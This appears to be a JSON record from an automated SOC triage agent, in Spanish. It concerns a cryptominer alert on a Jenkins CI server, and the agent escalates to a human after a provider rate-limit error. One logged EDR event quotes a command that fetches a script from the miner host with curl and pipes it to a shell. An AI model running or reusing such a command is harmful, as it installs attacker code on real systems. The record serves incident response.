@@ -1,0 +1,187 @@
+{
+  "alerta": {
+    "alert_id": "ALR-20261006-011826",
+    "created_at": "2026-10-06T01:18:09.000Z",
+    "source_product": "NGFW",
+    "rule_id": "UC-NET-002",
+    "rule_name": "Conexión a IP en lista de bloqueo de TI",
+    "severity": "high",
+    "status": "new",
+    "mitre": {
+      "tactic": "Command and Control",
+      "technique_id": "T1071",
+      "technique": "Application Layer Protocol"
+    },
+    "description": "Tráfico saliente hacia un indicador presente en la inteligencia de amenazas.",
+    "entities": {
+      "hosts": [
+        {
+          "hostname": "JENKINS-DEV01",
+          "ip": "10.60.1.10"
+        }
+      ],
+      "ips": [
+        "141.94.96.144"
+      ]
+    },
+    "evidence": {
+      "dst_ip": "141.94.96.144",
+      "dst_port": 3333,
+      "ti_match": "Pool de minería XMR",
+      "action": "allow"
+    },
+    "related_events": [
+      "FW-0025323"
+    ],
+    "runbook": "RB-09"
+  },
+  "ticket": {
+    "ticket_id": "TKT-20261006-011826",
+    "alert_ids": [
+      "ALR-20261006-011826"
+    ],
+    "title": "Triaje automático sin conclusión: Conexión a IP en lista de bloqueo de TI",
+    "verdict": "needs_more_info",
+    "confidence": 0.0,
+    "severity": "high",
+    "severity_rationale": "No calculada: el agente no terminó; se conserva la severidad de la regla.",
+    "affected": {
+      "users": [],
+      "hosts": [],
+      "business_services": [],
+      "customers": []
+    },
+    "summary": "El agente no produjo un ticket válido (límite de uso del proveedor agotado (429): Error code: 429). Requiere triaje manual.",
+    "evidence": [],
+    "enrichment": [],
+    "mitre": [
+      "T1071"
+    ],
+    "recommended_actions": [],
+    "escalation": {
+      "escalate": true,
+      "to": "N1 humano",
+      "reason": "límite de uso del proveedor agotado (429): Error code: 429"
+    },
+    "open_questions": [
+      "límite de uso del proveedor agotado (429): Error code: 429"
+    ],
+    "executed_actions": [],
+    "triage_seconds": 31.3
+  },
+  "traza": [
+    {
+      "tool": "consultar_alerta",
+      "args": {
+        "alert_id": "ALR-20261006-011826"
+      },
+      "ms": 1,
+      "chars": 697,
+      "error": null,
+      "preview": "{\"alert_id\": \"ALR-20261006-011826\", \"created_at\": \"2026-10-06T01:18:09.000Z\", \"source_product\": \"NGFW\", \"rule_id\": \"UC-NET-002\", \"rule_name\": \"Conexión a IP en lista de bloqueo de TI\", \"severity\": \"high\", \"status\": \"new\", \"mitre\": {\"tactic\": \"Command and Control\", \"technique_id\": \"T1071\", \"technique"
+    },
+    {
+      "tool": "consultar_activo",
+      "args": {
+        "hostname_o_ip": "JENKINS-DEV01"
+      },
+      "ms": 2,
+      "chars": 751,
+      "error": null,
+      "preview": "{\"asset_id\": \"A01174\", \"hostname\": \"JENKINS-DEV01\", \"ip\": \"10.60.1.10\", \"type\": \"Servidor CI/CD\", \"os\": \"Ubuntu 20.04 / Jenkins 2.426.2\", \"criticality\": \"Media\", \"zone\": \"DEV\", \"location\": \"CPD Barcelona\", \"business_service\": \"Integración continua\", \"owner_upn\": \"\", \"internet_facing\": \"True\", \"edr_i"
+    },
+    {
+      "tool": "consultar_inteligencia",
+      "args": {
+        "indicador": "141.94.96.144"
+      },
+      "ms": 4,
+      "chars": 514,
+      "error": null,
+      "preview": "{\"indicator\": \"141.94.96.144\", \"tip\": {\"indicator_type\": \"ip\", \"value\": \"141.94.96.144\", \"reputation\": \"malicious\", \"confidence\": 70, \"malware_family\": \"XMRig\", \"tags\": \"miner\", \"first_seen\": \"2026-09-20\", \"last_seen\": \"2026-10-15\", \"source\": \"Tarvia TIP (alimentado con feeds públicos)\", \"note\": \"\"}"
+    },
+    {
+      "tool": "buscar_cambios",
+      "args": {
+        "texto": "JENKINS-DEV01"
+      },
+      "ms": 4,
+      "chars": 2,
+      "error": null,
+      "preview": "[]"
+    },
+    {
+      "tool": "buscar_alertas_relacionadas",
+      "args": {
+        "texto": "JENKINS-DEV01",
+        "desde": "2026-10-05T00:00:00Z",
+        "hasta": "2026-10-07T00:00:00Z"
+      },
+      "ms": 45,
+      "chars": 922,
+      "error": null,
+      "preview": "{\"total_coincidencias\": 2, \"items\": [{\"alert_id\": \"ALR-20261006-011826\", \"created_at\": \"2026-10-06T01:18:09.000Z\", \"rule_id\": \"UC-NET-002\", \"rule_name\": \"Conexión a IP en lista de bloqueo de TI\", \"severity\": \"high\", \"entities\": {\"hosts\": [{\"hostname\": \"JENKINS-DEV01\", \"ip\": \"10.60.1.10\"}], \"ips\": [\""
+    },
+    {
+      "tool": "consultar_alerta",
+      "args": {
+        "alert_id": "ALR-20261006-011825"
+      },
+      "ms": 3,
+      "chars": 1085,
+      "error": null,
+      "preview": "{\"alert_id\": \"ALR-20261006-011825\", \"created_at\": \"2026-10-06T01:35:20.000Z\", \"source_product\": \"EDR\", \"rule_id\": \"UC-EDR-006\", \"rule_name\": \"Comportamiento de minería de criptomonedas\", \"severity\": \"high\", \"status\": \"new\", \"mitre\": {\"tactic\": \"Impact\", \"technique_id\": \"T1496\", \"technique\": \"Resourc"
+    },
+    {
+      "tool": "consultar_sandbox",
+      "args": {
+        "sha256": "561c0d422068e204fbcaf5c3fbf6575d6cf6a9610dc530cabd18cafdbaeabf83"
+      },
+      "ms": 4,
+      "chars": 545,
+      "error": null,
+      "preview": "{\"sha256\": \"561c0d422068e204fbcaf5c3fbf6575d6cf6a9610dc530cabd18cafdbaeabf83\", \"md5\": \"91e38186a1bbbad7c81a527d4f0636d6\", \"file_name\": \"kswapd0\", \"verdict\": \"malicious\", \"score\": 90, \"malware_family\": \"XMRig (CoinMiner)\", \"behaviors\": [\"ELF x86-64\", \"Argumentos stratum+tcp\", \"Se renombra como hilo d"
+    },
+    {
+      "tool": "consultar_inteligencia",
+      "args": {
+        "indicador": "45.148.10.121"
+      },
+      "ms": 4,
+      "chars": 566,
+      "error": null,
+      "preview": "{\"indicator\": \"45.148.10.121\", \"tip\": {\"indicator_type\": \"ip\", \"value\": \"45.148.10.121\", \"reputation\": \"suspicious\", \"confidence\": 55, \"malware_family\": \"\", \"tags\": \"scanner,exploit\", \"first_seen\": \"2026-09-20\", \"last_seen\": \"2026-10-15\", \"source\": \"Tarvia TIP (alimentado con feeds públicos)\", \"note"
+    },
+    {
+      "tool": "consultar_inteligencia",
+      "args": {
+        "indicador": "pool.supportxmr.com"
+      },
+      "ms": 4,
+      "chars": 330,
+      "error": null,
+      "preview": "{\"indicator\": \"pool.supportxmr.com\", \"tip\": {\"indicator_type\": \"domain\", \"value\": \"pool.supportxmr.com\", \"reputation\": \"malicious\", \"confidence\": 70, \"malware_family\": \"XMRig\", \"tags\": \"miner\", \"first_seen\": \"2026-09-20\", \"last_seen\": \"2026-10-15\", \"source\": \"Tarvia TIP (alimentado con feeds público"
+    },
+    {
+      "tool": "buscar_logs",
+      "args": {
+        "fuente": "edr_events",
+        "texto": "JENKINS-DEV01",
+        "desde": "",
+        "hasta": ""
+      },
+      "ms": 466,
+      "chars": 1431,
+      "error": null,
+      "preview": "{\"count\": 3, \"truncated\": false, \"items\": [{\"event_id\": \"EDR-0123423\", \"timestamp\": \"2026-10-06T01:14:00.000Z\", \"event_type\": \"process_start\", \"hostname\": \"JENKINS-DEV01\", \"user\": \"jenkins\", \"process_name\": \"sh\", \"process_path\": \"/bin/sh\", \"command_line\": \"sh -c curl -s http://141.94.96.144/x.sh | b"
+    }
+  ],
+  "razonamiento": [],
+  "uso": {
+    "input_tokens": 24114,
+    "output_tokens": 390,
+    "llamadas_modelo": 2
+  },
+  "modelo": "gemini/gemini-3.5-flash",
+  "triado_en": "2026-11-07T15:46:05.266347+00:00"
+}
